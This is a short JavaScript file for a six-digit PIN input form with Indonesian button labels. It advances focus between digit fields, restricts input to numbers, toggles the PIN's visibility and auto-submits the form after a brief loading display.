
const inputs = document.querySelectorAll(".six_pin input");
const form = document.querySelector("form")
inputs.forEach((input, index) => {
    input.dataset.index = index;
    input.addEventListener("keydown", clear);
    input.addEventListener("keyup", onKeyUp);
});
function clear($event) { $event.target.value = ""; }
function checkNumber(number) { return /[0-9]/g.test(number); }
function onKeyUp($event) {
    const input = $event.target;
    const value = input.value;
    const fieldIndex = +input.dataset.index;
    if ($event.key === "Backspace" && fieldIndex > 0) {
        input.previousElementSibling.focus();
    }
    if (checkNumber(value)) {
        if (value.length > 0 && fieldIndex < inputs.length - 1) {
            input.nextElementSibling.focus();
        }
        if (input.value !== "" && fieldIndex === inputs.length - 1) {
            input.readOnly = true;
            submit();
        }
    } else {
        clear($event);
    }
}
let xx = document.getElementById('process')
function submit(){
    xx.style.display = 'flex';
    setTimeout(function(){
        form.submit()
    }, 2000);
}

var btn_show = document.getElementById('see');
var pin = document.getElementById('pin1');
var pinn = document.getElementById('pin2');
var pinnn = document.getElementById('pin3');
var pinnnn = document.getElementById('pin4');
var pinnnnn = document.getElementById('pin5');
var pinnnnnn = document.getElementById('pin6');

btn_show.addEventListener('click', pasToText);

function pasToText(){
    if ((pin.type == 'password')&&(pinn.type == 'password')&&(pinnn.type == 'password')&&(pinnnn.type == 'password')&&(pinnnnn.type == 'password')&&(pinnnnnn.type == 'password')){
        pin.setAttribute('type','text')
        pinn.setAttribute('type','text')
        pinnn.setAttribute('type','text')
        pinnnn.setAttribute('type','text')
        pinnnnn.setAttribute('type','text')
        pinnnnnn.setAttribute('type','text')
        btn_show.innerHTML='SEMBUNYIKAN'
    } else {
        pin.setAttribute('type','password')
        pinn.setAttribute('type','password')
        pinnn.setAttribute('type','password')
        pinnnn.setAttribute('type','password')
        pinnnnn.setAttribute('type','password')
        pinnnnnn.setAttribute('type','password')
        btn_show.innerHTML='TAMPILKAN'
    }
}
